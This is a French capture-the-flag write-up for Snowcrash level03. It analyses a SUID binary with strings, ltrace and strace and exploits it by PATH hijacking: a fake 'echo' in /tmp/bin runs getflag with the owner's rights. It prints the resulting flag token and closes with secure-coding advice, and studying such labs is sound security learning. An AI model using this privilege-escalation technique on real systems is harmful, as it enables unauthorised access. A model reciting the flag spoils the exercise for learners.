# Level 03 - Snowcrash

## Objectif

Exploiter un binaire SUID vulnérable à l'injection de PATH.

### 💡 Qu'est-ce qu'un SUID vulnérable ?

**SUID (Set User ID)** est un bit de permission spécial qui permet à un programme de s'exécuter avec les droits de son **propriétaire** plutôt qu'avec les droits de l'utilisateur qui le lance.

Un **SUID vulnérable** est un binaire qui :

1. Possède le bit SUID actif (`-rwsr-xr-x`)
2. Appartient à un utilisateur privilégié (ex: `flag03`)
3. Contient une **faille de sécurité exploitable** (ex: utilise des commandes sans chemin absolu)

**Conséquence** : En exploitant la faille, vous pouvez exécuter du code arbitraire avec les privilèges du propriétaire, permettant une **escalade de privilèges**.

## Analyse

### Étape 1 : Identifier le binaire SUID

```bash
ls -l ~/level03
```

Résultat :

```
-rwsr-sr-x 1 flag03 level03 8627 Mar 5 2016 level03
```

Le fichier a le **bit SUID** actif (`s` dans `rws`), il s'exécute donc avec les droits de `flag03`.

### Étape 2 : Analyser le binaire

#### Méthode 1 : `strings` (voir les chaînes de texte)

```bash
strings level03 | grep echo
```

Résultat :

```
/usr/bin/env echo Exploit me
```

**Analyse** : `echo` n'a pas de chemin absolu → cherché dans PATH → Vulnérable !

#### Méthode 2 : `ltrace` (voir les appels de bibliothèque)

```bash
ltrace ./level03
```

Résultat :

```
__libc_start_main(0x80484a4, 1, 0xbffff7f4, 0x80484f0, ...)
system("/usr/bin/env echo Exploit me")
+++ exited (status 0) +++
```

**Analyse** : On voit directement l'appel à `system()` avec la commande vulnérable.

#### Méthode 3 : `strace` (voir les appels système)

```bash
strace ./level03 2>&1 | grep exec
```

Résultat :

```
execve("./level03", ["./level03"], [/* 18 vars */]) = 0
execve("/bin/sh", ["sh", "-c", "/usr/bin/env echo Exploit me"], [/* 18 vars */]) = 0
```

**Analyse** : Moins direct, mais montre que `/bin/sh` exécute la commande avec `env`.

#### 🎯 Comparaison des outils

| Outil         | Utilité                       | Facilité | Meilleur pour                        |
| ------------- | ----------------------------- | -------- | ------------------------------------ |
| **`strings`** | Extraire les chaînes de texte | ⭐⭐⭐   | Détection rapide de commandes        |
| **`ltrace`**  | Tracer les appels de fonction | ⭐⭐⭐   | Voir les appels `system()`, `exec()` |
| **`strace`**  | Tracer les appels système     | ⭐⭐     | Debugging bas niveau                 |

**Vulnérabilité détectée** : Le binaire utilise `/usr/bin/env echo` qui cherche `echo` dans le `PATH`.

## Solution

### Exploitation par PATH Hijacking

```bash
# 1. Créer un répertoire temporaire
mkdir /tmp/bin

# 2. Modifier le PATH pour prioriser /tmp/bin
export PATH="/tmp/bin:$PATH"

# 3. Créer un faux "echo" malveillant
echo "getflag" > /tmp/bin/echo

# 4. Rendre le script exécutable
chmod +x /tmp/bin/echo

# 5. Exécuter le binaire vulnérable
./level03
```

### Résultat

```
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

**Flag** : `qi0maab88jeaj46qoumi7maus`

## Explication

### Pourquoi c'est vulnérable ?

1. Le binaire `level03` appartient à `flag03` avec SUID
2. Il exécute : `system("/usr/bin/env echo Exploit me")`
3. `/usr/bin/env` cherche la commande `echo` dans le **PATH**
4. En modifiant le PATH, on peut injecter notre propre `echo`
5. Notre faux `echo` s'exécute avec les droits de `flag03` !

### Schéma d'exploitation

```
PATH normal:     /usr/local/bin:/usr/bin:/bin
                              ↓
                 Trouve /bin/echo (légitime)

PATH modifié:    /tmp/bin:/usr/local/bin:/usr/bin:/bin
                    ↓
                 Trouve /tmp/bin/echo (malveillant) EN PREMIER !
```

### Différence avec un binaire sécurisé

```bash
# ❌ Vulnérable
system("/usr/bin/env echo test")
→ env cherche "echo" dans PATH → Exploitable

# ✅ Sécurisé
system("/bin/echo test")
→ Chemin absolu direct → Non exploitable
```

## Note de sécurité

Cette vulnérabilité illustre l'importance de :

- Ne jamais utiliser `system()` avec des chemins relatifs
- Toujours spécifier des chemins absolus pour les commandes
- Nettoyer les variables d'environnement dans les programmes SUID
